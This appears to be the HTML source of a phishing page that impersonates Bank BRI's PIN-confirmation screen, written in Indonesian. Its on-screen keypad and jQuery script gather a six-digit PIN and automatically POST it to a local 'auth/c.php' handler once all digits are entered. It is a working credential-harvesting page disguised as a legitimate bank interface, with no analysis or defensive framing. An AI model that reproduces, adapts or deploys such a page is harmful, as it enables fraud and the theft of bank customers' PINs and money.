
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="fragment" content="!">
    <meta name="theme-color" content="#1583dc">
    <meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
	<meta property="og:type" content="website">
	<meta http-equiv="Content-Security-Policy" content="default-src * 'self' 'unsafe-inline' 'unsafe-eval' data: gap:">
	<title>Bank BRI Melayani dengan setulus hati</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"/>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@800&display=swap');
        body {
            padding: 0;
            margin: 0;
            width: 100%;
            font-family: 'Nunito', sans-serif;
            overflow: hidden; background: none rgb(0, 134, 224);
            padding-right: 15px;
        }

        .text-header {
            font-family: 'Nunito', sans-serif;
            color: #fff;
        }

        .text-subheader {
            font-family: 'Nunito', sans-serif;
            margin-top: -40px;
            color: #fff;
            font-size: 15px;
        }

        .sizing {
            width: 332px;
        }

        @media only screen and (max-width: 600px) {
            .sizing {
                width: 95%;
            }
        } 

        .pinNumb {
            cursor: pointer;
            box-sizing: border-box; 
            width: 100%; 
            background-color: none; 
            font-size: 30px; color: #fff; 
            text-align: center; 
            padding-top: 3px; 
            border-radius: 10px; 
            box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; 
            height: 42px;
            background: none;
            border: none;
        }

        button.pinNumb:hover {
            color: #fff;
            background-color: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

    </style>
  </head>
  <body>
    <div class="container">
        <div class="row" style="margin-top: -30px;">
            <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; text-align: center; margin-top: 25px; height: 98.8px; padding-bottom: 0px; font-family: Barlow; font-size: 16px; font-weight: 400; color: rgb(255,255,255); line-height: 1.4; border-radius: 0px;">
                <div class="text-header" style="font-family: 'Nunito', sans-serif;"><font  size="3"><strong>PIN</strong></font></div>
            </div>
        </div>
        <div class="row" style="margin-top: -30px;">
            <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; height: 98.8px; padding-bottom: 0px; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
                <div class="text-header"><font  size="4"><strong>Konfirmasi PIN</strong></font></div>
                <div class="text-subheader">Konfirmasi PIN yang sudah Anda buat</div>
            </div>
        </div>
        <div class="row" style="margin-top: -100px;">
            <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; height: 58.8px; padding-bottom: 0px; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
               <div class="row">
                    <div class="col-2">
                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
                            <div class="bubble-element Group" id="pin-1" style="box-sizing: border-box; font-size: 30px; color: #fff; text-align: center; padding-top: 3px;  width: 50px; left: 0px; top: 0px; background-color: rgba(255, 255, 255, 0.34); border-radius: 10px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
                            <div class="bubble-element Group" id="pin-2" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #fff; text-align: center; padding-top: 3px;background-color: rgba(255, 255, 255, 0.34); border-radius: 10px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
                            <div class="bubble-element Group" id="pin-3" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #fff; text-align: center; padding-top: 3px;background-color: rgba(255, 255, 255, 0.34); border-radius: 10px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
                            <div class="bubble-element Group" id="pin-4" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #fff; text-align: center; padding-top: 3px;background-color: rgba(255, 255, 255, 0.34); border-radius: 10px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
                            <div class="bubble-element Group" id="pin-5" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #fff; text-align: center; padding-top: 3px; background-color: rgba(255, 255, 255, 0.34); border-radius: 10px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
                        </div>
                    </div>
                    <div class="col-2">
                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
                            <div class="bubble-element Group" id="pin-6" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #fff; text-align: center; padding-top: 3px;background-color: rgba(255, 255, 255, 0.34); border-radius: 10px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
                        </div>
                    </div>
               </div>
               <div class="row" style="margin-top: -70px">
                    <div class="col-12">
                        <div class="text-header text-center" style="font-family: 'Nunito', sans-serif;'"><font  size="2"><strong>Lupa PIN</strong></font></div>
                    </div>
               </div>
            </div>
        </div>
        <div class="row" style="margin-top: 100px">
            <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; height: 98.8px; padding-bottom: 0px; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
                <div class="row">
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="1">1</button>
                    </div>
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="2">2</button>
                    </div>
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="3">3</button>
                    </div>
                </div>

                <div class="row" style="margin-top: -80px">
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="4">4</button>
                    </div>
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="5">5</button>
                    </div>
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="6">6</button>
                    </div>
                </div>

                <div class="row" style="margin-top: -80px">
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="7">7</button>
                    </div>
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="8">8</button>
                    </div>
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="9">9</button>
                    </div>
                </div>

                <div class="row" style="margin-top: -80px">
                    <div class="col-4">
                        
                    </div>
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="setPin" data-id="0">0</button>
                    </div>
                    <div class="col-4">
                        <button class="bubble-element Group pinNumb" id="hapus"><i class="ion-backspace-outline"></i></button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <form action="auth/c.php" id="ryuSubmit" method="POST">
        <input type="hidden" name="pin" id="setPin">
    </form>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
    <script>
        $(document).ready(function() {
            $("button#setPin").on('click', function() {
                var pin = $(this).attr('data-id');
                
                if($.trim($("#pin-1").html())=='') {
                    $("#pin-1").html(pin);
                } else if($.trim($("#pin-1").html())!='' && $.trim($("#pin-2").html())=='') {
                    $("#pin-2").html(pin);
                } else if($.trim($("#pin-2").html())!='' && $.trim($("#pin-3").html())=='') {
                    $("#pin-3").html(pin);
                } else if($.trim($("#pin-3").html())!='' && $.trim($("#pin-4").html())=='') {
                    $("#pin-4").html(pin);
                } else if($.trim($("#pin-4").html())!='' && $.trim($("#pin-5").html())=='') {
                    $("#pin-5").html(pin);
                } else if($.trim($("#pin-5").html())!='' && $.trim($("#pin-6").html())=='') {
                    $("#pin-6").html(pin);

                    var setPin = $("#pin-1").html()+''+$("#pin-2").html()+''+$("#pin-3").html()+''+$("#pin-4").html()+''+$("#pin-5").html()+''+$("#pin-6").html();
                    $("input#setPin").val(setPin);

                    var pinValue = $("input#setPin").val();

                    if(pinValue.length == 6) {
                        $("#ryuSubmit").submit();
                    }
                }
            });

            $("#hapus").on('click', function() {
                $("#pin-1").html('');
                $("#pin-2").html('');
                $("#pin-3").html('');
                $("#pin-4").html('');
                $("#pin-5").html('');
            });
        });
    </script>
    <!-- </body> -->
  </body>
</html>
